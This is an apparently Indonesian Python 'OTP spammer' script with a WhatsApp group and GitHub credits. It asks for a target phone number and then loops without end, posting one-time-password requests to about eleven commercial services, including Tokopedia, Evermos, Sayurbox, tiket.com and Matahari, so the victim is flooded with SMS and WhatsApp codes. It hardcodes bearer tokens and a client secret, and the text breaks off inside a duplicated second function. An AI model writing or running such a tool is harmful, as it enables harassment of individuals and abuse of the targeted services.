import os,sys,time,requests,json,bs4,re
from bs4 import BeautifulSoup
from colorama import Fore,init,Back

H="\033[1;92m" # Hijau
putih="\033[1;97m" # Putih
Ab="\033[1;90m" # Abu Abu
Y="\033[1;93m" # Kuning
U="\033[1;95m" # Ungu
gktau="33[37;1m" # Entah
B="\033[1;96m" # Biru
W="\033[1;0m"
#Tulisan Background Merah
bg="\033[1;0m\033[1;41msubscribe\033[1;0m"
bg2="\033[1;0m\033[1;41m(AMMAR EXECUTED)\033[1;0m"
BL = Fore.BLUE
WH = Fore.WHITE
R = Fore.RED
G = Fore.GREEN
BL = Fore.BLACK
YE = Fore.YELLOW
#┌
#│

def about():
    print (f"""{U}┌──────────────────────────────────── {putih}About Tools {U}─────────────────────────────────────┐
{U}│{B}Wellcome User. My Name Ammar Saya Adalah Pembuat Script Ini Sebelum Menggunakan {U}      │
{U}│{B}Install Module Bahan Terlebih dahulu agar dapat menjalankan tools saya yang lainnya  {U} │
{U}│{B}Lupa Follow My Github Dan My Instagram. Mungkin Hanya Itu Yang Bisa Saya Infokan {U}     │
{U}│{B}Bergabung Ke Grup Bisa Copy link dibwah Thx For Using.                   {U}             │
{U}│{putih}Creator {R}:{H} AmmarBN                                            {U}                         │
{U}│{putih}Supported {R}:{H} SanzzXD                                          {U}                         │
{U}│{putih}github {R}:{H} github.com/AmmarrBN                                 {U}                         │
{U}│{putih}Link Group {R}:{H} https://chat.whatsapp.com/G7vPdgeA2YnHulTkg58HkJ                         {U}│
{U}└──────────────────────────────────────────────────────────────────────────────────────┘""")

def tanya():
    back=input(f"   {putih}Back to tools{R}? ({U}enter{putih}/{U}t{R}):{H} ")
    if back == "" or back == " ":
        print (f"   {putih}Wait... Go to back tools")
        time.sleep(5)
        mulai()
    if back == "t" or back == "T":
        time.sleep(4)
        print (f"   {putih}[{H}✓{putih}] Thx For Using Tools")
        sys.exit
    

def countdown(time_sec):
	try:
		while time_sec:
			mins, secs = divmod(time_sec,60)
			timeformat = '\033[1;97m[\033[1;93m•\033[1;97m] Silakan Menunggu Dalam Waktu \033[1;92m{:02d}:{:02d}'.format(mins,secs)
			print(timeformat,end='\r')
			time.sleep(1)
			time_sec -= 1
		time.sleep(5)
	except KeyboardInterrupt:
                print (f"{W}Program Terminated [{R}!{W}]")
                sys.exit()

def wangsaf():
    try:
        ip=requests.get('https://api.ipify.org').text
        localtime=localtime=time.asctime(time.localtime(time.time()))
        nomor=input(f"{putih}   [{Y}•{putih}] Target Number {putih}({Y}8xx{putih}) {R}:{H} ")
        while True:
            tod = requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","content-length":"306","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","x-tokko-api-client":"merchant_web","content-type":"application/json","accept":"*/*","x-tokko-api-client-version":"4.5.1","sec-ch-ua-platform":"Android","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
            ksjs=requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"s6abXpSHh6_mTsxfvOynJM","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
            site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text
            search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
            sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',})
            gas=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko","sec-ch-ua-platform":"Linux","origin":"https://web.tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
            cook={"cookie":"_gcl_au=1.1.909457086.1662115605","cookie":"__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"__gtm_referrer=https%3A%2F%2Fwww.google.com%2F","cookie":"_gid=GA1.2.1927488580.1662115605","cookie":"_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_fbp=fb.1.1662115607118.1815022728","cookie":"_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0","cookie":"poptin_old_user=true","cookie":"poptin_user_id=0.42qy01qhmjj","cookie":"evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137","cookie":"evm_version=2.48.14","cookie":"utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D","cookie":"_ga=GA1.2.56596919.1662115604","cookie":"_gat_gtag_UA_127603098_1=1","cookie":"_gat_UA-127603098-1=1","cookie":"_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0","cookie":"rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D","cookie":"rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D","cookie":"_gat=1","cookie":"MgidSensorNVis=2","cookie":"MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7","cookie":"_gat_%5Bobject%20Object%5D=1","cookie":"afUserId=154dedac-a679-4204-8121-fbd290672de8-p","cookie":"AF_SYNC=1662115627689","cookie":"registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"+nomor+"%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
            "cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
            Arifa=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","content-length":"25","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor}),cookies=cook).text
            alokpos=requests.post("https://api.qoalaplus.com/go-agent/v2/user/register",headers={"Host": "api.qoalaplus.com","content-length": "48","accept": "application/json, text/plain, */*","user-agent": "Mozilla/5.0 (Linux; Android 10; Redmi 8) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/87.0.4280.101 Mobile Safari/537.36","content-type": "application/json","origin": "https://www.qoalaplus.com","sec-fetch-site": "same-site","sec-fetch-mode": "cors","sec-fetch-dest": "empty","referer": "https://www.qoalaplus.com/","accept-encoding": "gzip, deflate, br","accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone_number":"+62"+nomor,"channel":"WA"})).text
            js=json.dumps([{"operationName":"generateOTP","variables":{"destinationType":"whatsapp","identity":"+62"+nomor},"query":"mutation generateOTP($destinationType: String!, $identity: String!) {\n  generateOTP(destinationType: $destinationType, identity: $identity) {\n    id\n    __typename\n  }\n}"}])
            ken=requests.post("https://www.sayurbox.com/graphql/v1?deduplicate=1",headers={'Host':'www.sayurbox.com','content-length':'289','sec-ch-ua':'"Google Chrome";v="105", "Not)A;Brand";v="8", "Chromium";v="105"','x-device-info':'{"platform":"web","is_app":false,"is_mobile":true,"device_type":"mobile","device_id":"LWUOU5jfEtY_43IsmFme_","os_name":"Android","os_version":"11","brand":null,"model":null,"client_ip":"::ffff:10.10.212.88","pixel_density":2}','sec-ch-ua-mobile':'?1','authorization':'eyJhbGciOiJSUzI1NiIsImtpZCI6ImY4NDY2MjEyMTQxMjQ4NzUxOWJiZjhlYWQ4ZGZiYjM3ODYwMjk5ZDciLCJ0eXAiOiJKV1QifQ.eyJhbm9ueW1vdXMiOnRydWUsImF1ZCI6InNheXVyYm94LWF1ZGllbmNlIiwiYXV0aF90aW1lIjoxNjYyMzc2NTc0LCJleHAiOjE2NjQ5Njg1NzQsImlhdCI6MTY2MjM3NjU3NCwiaXNzIjoiaHR0cHM6Ly93d3cuc2F5dXJib3guY29tIiwibWV0YWRhdGEiOnsiZGV2aWNlX2luZm8iOm51bGx9LCJuYW1lIjpudWxsLCJwaWN0dXJlIjpudWxsLCJwcm92aWRlcl9pZCI6ImFub255bW91cyIsInNpZCI6IjFmOWE0NGI0LTE0MTgtNGIyNC1iYTRkLWU0MTEwN2FjOWU2NSIsInN1YiI6IjRwZUpiTjB5cUpuQkd4NDBfMGVWbWV1S3lkYWQiLCJ1c2VyX2lkIjoiNHBlSmJOMHlxSm5CR3g0MF8wZVZtZXVLeWRhZCJ9.hbvAGWui1gSK26sEzhC9l790_JVobzkR3j82ZPi1hIwflbf-f08WTRbTraE7_6U_Q60QetC0Xk-GR3JndHodWuXvMbi0yIum8ghQ2fGG4ZR5F9RdPWOv0k1v10NyxOxUuWdfVUK_wMqoYZGK4klL2B3InPd-WMra4MhX9JoW91LBtpLx-tm5GLzPytX5hHINiqs6hZnvypbIBGqQr5oQp_ruJNezAfUBtYVmHdUahlJs1j9aD8IDF-86NVGGEfLjOMERi1cet4mf8uJmKn9ScIP18XMQVAdoxJnkVTwPQBOvQsP2EOMyh___hYvpjwe2T4qriGD1lpMgP2cHuf-dxw','content-type':'application/json','accept':'*/*','x-bundle-revision':'6.0','x-sbox-tenant':'sayurbox','x-binary-version':'2.2.1','user-agent':'Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36','sec-ch-ua-platform':'"Android"','origin':'https://www.sayurbox.com','sec-fetch-site':'same-origin','sec-fetch-mode':'cors','sec-fetch-dest':'empty','accept-encoding':'gzip, deflate, br','accept-language':'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7'},data=js).text
            rupa = requests.post("https://wapi.ruparupa.com/auth/generate-otp",headers={"Host":"wapi.ruparupa.com","content-length":"117","sec-ch-ua-mobile":"?1","authorization":"eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1dWlkIjoiN2JjZTk0N2QtZTMwOS00YjYyLTk1NWItZTJkNTMyNWVmY2U5IiwiaWF0IjoxNjYyMzczNjM2LCJpc3MiOiJ3YXBpLnJ1cGFydXBhIn0.FEO05D4v9bvaU-Kpgo4XvwbIWhbm3uamIDTCsRmm_Gs","content-type":"application/json","x-company-name":"odi","accept":"application/json","informa-b2b":"false","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","user-platform":"mobile","x-frontend-type":"mobile","sec-ch-ua-platform":"Android","origin":"https://m.ruparupa.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.ruparupa.com/verification?page=otp-choices","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"0"+nomor,"action":"register","channel":"chat","email":"","token":"","customer_id":"0","is_resend":0})).text
            possing = requests.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp",headers={"Host":"www.matahari.com","content-length":"76","x-newrelic-id":"Vg4GVFVXDxAGVVlVBgcGVlY=","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","x-requested-with":"XMLHttpRequest","sec-ch-ua-platform":"Android","origin":"https://www.matahari.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.matahari.com/customer/account/create/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"otp_request":{"mobile_number":"0"+nomor,"mobile_country_code":"+62"}})).text
            reqiu = requests.post("https://gql.tiket.com/",headers={"Host":"gql.tiket.com","content-length":"861","deviceid":"94c367e263f2084cf76955d6ed049664","newsession":"true","tiketsessionid":"c8da7b04-239c-49d8-a303-54f310e54734","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","content-type":"application/json","accept":"*/*","channelid":"MOBILE","lang":"id","platform":"mweb","sec-ch-ua-platform":"Android","origin":"https://m.tiket.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://m.tiket.com/login","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"operationName":"postOtpGenerateV2","variables":{"ignoreRecipient":"","recipient":"+62"+nomor,"deviceId":"484c6211-c182-4de8-a71f-8be3d9","requestType":"GUEST_VERIFY_PHONE","magicLinkAdditionalParameter":"type=SHOW_DETAIL_FORM&fieldStatus=UNREGISTERED"},"query":"mutation postOtpGenerateV2($recipient: String, $requestType: String, $ignoreRecipient: Boolean, $magicLinkAdditionalParameter: String, $fullName: String, $deviceId: String) {\n  otpGenerateV2(recipient: $recipient, requestType: $requestType, ignoreRecipient: $ignoreRecipient, magicLinkAdditionalParameter: $magicLinkAdditionalParameter, fullName: $fullName, deviceId: $deviceId) {\n    code\n    message\n    data {\n      exist\n      expired\n      maskedAccount\n      nextAvailableRequest\n      trxId\n      __typename\n    }\n    errors\n    serverTime\n    __typename\n  }\n}\n"})).text
            leceh = requests.post("https://apigw.ralali.com/auth/v3/register",headers={"Host":"apigw.ralali.com","content-length":"73","accept-language":"id","sec-ch-ua-mobile":"?1","authorization":"Bearer eyJhbGciOiJSUzI1NiIsInR5cCI6IkpXVCJ9.eyJjbGllbnRfaWQiOjEwMDAwLCJ0b2tlbl92ZXJzaW9uIjoiMS4wLjAiLCJ0b2tlbl90eXBlIjoiZ3Vlc3RfdG9rZW4iLCJhdWQiOiIxMSIsImV4cCI6MTY2NDk2NTIwMCwianRpIjoiMjEzZDYyYmYtMzc3Zi0xNTQyLTgxMTktNmI0ZTk4NTQyZjY5IiwiaWF0IjoxNjY0ODc4ODAwLCJpc3MiOiIvZXgvdjMvdG9rZW4ifQ.gaglUqqmWA0WaORQsyLstjSq2G3OAGxp2CZ5lRshAUvDumYsCTIvatOkBc5s40qsLm0lxpGIERBdgkasWEI81HRk020cLMd_fjiqS74BLbfDMM2Mwro2e_9itqsKGwQlfoGOCSuMFzD1IXvp8yE4mcVsUq6JQzv5oUtmU3KP5SSoinGtxavVrn9Lqy299h_pGjmo1DpUfdq0fggKf3RdL28yJdI5JPV62PUwbJ1gdKOyr2bSLi6nfWRYl2eKnl8uViAo6TVN3Ojd5f5PnyH4UJPHw5XW2Kbf_fpnm0t9XXFYxBoVM9uLDzR2-Hh-DnNVoFublq4LdC5eP5x5dQE6cg","content-type":"application/json","accept":"application/json","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://m.ralali.com","sec-fetch-site":"same-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","accept-encoding":"gzip, deflate, br"},data=json.dumps({"otp_channel":"whatsapp","validate_by":"+62"+nomor,"name":"SanzXD"})).text
            done=0
            die=0
            if "errors" in tod:
                done += 1
            else:
                die += 1
            if "Send successfully" in ksjs:
                done += 1
            else:
                die += 1
            if "<Response [200]>" in sending:
                done += 1
            else:
                die += 1
            if "OTP_SENT" in gas:
                done += 1
            else:
                die += 1
            if "Evermos OTP" in Arifa:
                done += 1
            else:
                die += 1
            if "Success to register account data" in alokpos:
                done += 1
            else:
                die += 1
            if "AuthIDResponseType" in ken:
                done += 1
            else:
                die += 1
            if "Kode verifikasi berhasil dikirimkan" in rupa:
                done += 1
            else:
                die += 1
            if "Success" in possing:
                done += 1
            else:
                die += 1
            if "!" in reqiu:
                done += 1
            else:
                die += 1
            if "Berhasil melakukan registrasi user." in leceh:
                done += 1
            else:
                die += 1
            print (f"{U}┌───────────────────────────────────── {putih}Result Spm {U}─────────────────────────────────────┐")
            print (f"{U}│ {Y}• {putih}Target Number {R}:{H} +62{nomor}                                   ")
            print (f"{U}│ {Y}• {putih}Your Ip       {R}:{H} {ip}                                         ")
            print (f"{U}│ {Y}• {putih}Time          {R}:{H} {localtime}                                  ")
            print (f"{U}└───┬──────────────────────────────────────────────────────────────────────────────────┘")
            print (f"{Y}    ├──{R}▶{putih} Total Success {B}:{H} ",done)
            print (f"{Y}    ╰──{R}▶{putih} Total Denied  {B}:{R} ",die)
            countdown(90)
    except KeyboardInterrupt:
        tanya()
    except requests.exceptions.ConnectionError:
        print (f"   {R}Error!! {putih}not connected to the network")
        tanya()
            
def spm_sw():
    try:
        ip=requests.get('https://api.ipify.org').text
        localtime=localtime=time.asctime(time.localtime(time.time()))
        nomor=input(f"{putih}   [{Y}•{putih}] Target Number {putih}({Y}8xx{putih}) {R}:{H} ")
        while True:
            tod = requests.post("https://api.tokko.io/graphql",headers={"Host":"api.tokko.io","content-length":"306","accept-language":"id","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36","x-tokko-api-client":"merchant_web","content-type":"application/json","accept":"*/*","x-tokko-api-client-version":"4.5.1","sec-ch-ua-platform":"Android","origin":"https://web.lummoshop.com","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.lummoshop.com/","accept-encoding":"gzip, deflate, br"},data=json.dumps({"operationName":"generateOTP","variables":{"generateOtpInput":{"phoneNumber":"+62"+nomor,"hashCode":"","channel":"WHATSAPP","userType":"MERCHANT"}},"query":"mutation generateOTP($generateOtpInput: GenerateOtpInput!) {\n  generateOtp(generateOtpInput: $generateOtpInput) {\n    phoneNumber\n  }\n}\n"})).text
            ksjs=requests.post("https://www.carsome.id/website/login/sendSMS",headers={"Host":"www.carsome.id","content-length":"38","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36","content-type":"application/json","accept":"application/json, text/plain, */*","country":"ID","x-amplitude-device-id":"s6abXpSHh6_mTsxfvOynJM","sec-ch-ua-platform":"Android","origin":"https://www.carsome.id","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://www.carsome.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"username":nomor,"optType":1})).text
            site = requests.get('https://accounts.tokopedia.com/otp/c/page?otp_type=116&msisdn=0'+nomor+'&ld=https%3A%2F%2Faccounts.tokopedia.com%2Fregister%3Ftype%3Dphone%26phone%3D{}%26status%3DeyJrIjp0cnVlLCJtIjp0cnVlLCJzIjpmYWxzZSwiYm90IjpmYWxzZSwiZ2MiOmZhbHNlfQ%253D%253D', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}).text
            search = re.search(r'\<input\ id\=\"Token\"\ value\=\"(.*?)\"\ type\=\"hidden\"\>', site).group(1)
            sending = requests.post('https://accounts.tokopedia.com/otp/c/ajax/request-wa', headers = {'Connection' : 'keep-alive','Accept' : 'application/json, text/javascript, */*; q=0.01','Origin' : 'https://accounts.tokopedia.com','X-Requested-With' : 'XMLHttpRequest','User-Agent' : '{acak}','Content-Type' : 'application/x-www-form-urlencoded; charset=UTF-8','Accept-Encoding' : 'gzip, deflate',}, data = {'otp_type' : '116','msisdn' : '0'+nomor,'tk' : search,'email' : '','original_param' : '','user_id' : '','signature' : '',})
            gas=requests.post("https://api-v2.bukuwarung.com/api/v2/auth/otp/send",headers={"Host":"api-v2.bukuwarung.com","content-length":"198","sec-ch-ua-mobile":"?0","user-agent":"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Safari/537.36","content-type":"application/json","x-app-version-name":"android","accept":"application/json, text/plain, */*","x-app-version-code":"3001","buku-origin":"tokoko","sec-ch-ua-platform":"Linux","origin":"https://web.tokoko.id","sec-fetch-site":"cross-site","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://web.tokoko.id/","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"action":"LOGIN_OTP","countryCode":"+62","deviceId":"test-1","method":"WA","phone":nomor,"clientId":"2e3570c6-317e-4524-b284-980e5a4335b6","clientSecret":"S81VsdrwNUN23YARAL54MFjB2JSV2TLn"})).text
            cook={"cookie":"_gcl_au=1.1.909457086.1662115605","cookie":"__gtm_campaign_url=https%3A%2F%2Fevermos.com%2Freg%2Fsitelink_daftar%2F%3Fgclid%3DCj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"__gtm_referrer=https%3A%2F%2Fwww.google.com%2F","cookie":"_gid=GA1.2.1927488580.1662115605","cookie":"_gac_UA-127603098-29=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gac_UA-127603098-27=1.1662115605.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_gcl_aw=GCL.1662115606.Cj0KCQjw08aYBhDlARIsAA_gb0dDc9NamzcOxmWAQSH2PImk23nmLXb14r6Jdl0LDiQYzXGS-o0lwvQaAidzEALw_wcB","cookie":"_fbp=fb.1.1662115607118.1815022728","cookie":"_ga_E48JMVJVEG=GS1.1.1662115603.1.0.1662115609.0.0.0","cookie":"poptin_old_user=true","cookie":"poptin_user_id=0.42qy01qhmjj","cookie":"evm_client_token=fd0c103b778b2da4bf5cd3520ff64a500f3f1137","cookie":"evm_version=2.48.14","cookie":"utm_tracker=%7B%22source_link%22%3A%22versionb.ea7%22%7D","cookie":"_ga=GA1.2.56596919.1662115604","cookie":"_gat_gtag_UA_127603098_1=1","cookie":"_gat_UA-127603098-1=1","cookie":"_ga_8NN2ZT44WP=GS1.1.1662115616.1.0.1662115619.0.0.0","cookie":"rl_page_init_referrer=RudderEncrypt%3AU2FsdGVkX19cj2GvLExMO7pRcRLevWUUYg9hSlCCKEbtmQAzju4RWUWo22yC%2B3dUMBswi22yZpDc2jU3DHURNmVnOfZLpfGzkMpatP9yCh0%3D","cookie":"rl_page_init_referring_domain=RudderEncrypt%3AU2FsdGVkX18v21NYtvQDe7sPj6DM6%2BqN8HCmUTTSGrA%3D","cookie":"_gat=1","cookie":"MgidSensorNVis=2","cookie":"MgidSensorHref=https://evermos.com/registration?source_link=versionb.ea7","cookie":"_gat_%5Bobject%20Object%5D=1","cookie":"afUserId=154dedac-a679-4204-8121-fbd290672de8-p","cookie":"AF_SYNC=1662115627689","cookie":"registered_user=%7B%22verificationToken%22%3Anull%2C%22phone%22%3A%2262"+nomor+"%22%2C%22password%22%3A%22jsjwjwhebe%22%2C%22name%22%3A%22Zgsghshsbs%22%2C%22subDistrictId%22%3A%223175%22%2C%22referral%22%3Anull%7D",
            "cookie":"otp_config=%7B%22action%22%3A%22registration%2FdoRegister%22%2C%22redirectUrl%22%3A%22%2Fcatalog%3FnewUser%3D1%22%7D","cookie":"rl_anonymous_id=RudderEncrypt%3AU2FsdGVkX1%2B%2BfZWMpHNJzHadlZHZva4JNdrFmOCLYIX0Qh5h%2FPDZ8c2htJ%2FhtS9bKg3eddpUadVfLXPe7%2FYiIw%3D%3D","cookie":"amp_e15389=3AYNBj9lB2pDQI8v06V0tC...1gbusvcej.1gbut0lb0.6.0.6"}
            Arifa=requests.post("https://evermos.com/api/register/phone-registration",headers={"Host":"evermos.com","content-length":"25","accept":"application/json, text/plain, */*","content-type":"application/json;charset=UTF-8","sec-ch-ua-mobile":"?1","user-agent":"Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Mobile Safari/537.36","sec-ch-ua-platform":"Android","origin":"https://evermos.com","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-dest":"empty","referer":"https://evermos.com/registration/otp","accept-encoding":"gzip, deflate, br","accept-language":"id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"},data=json.dumps({"phone":"62"+nomor}),cookies=cook).text
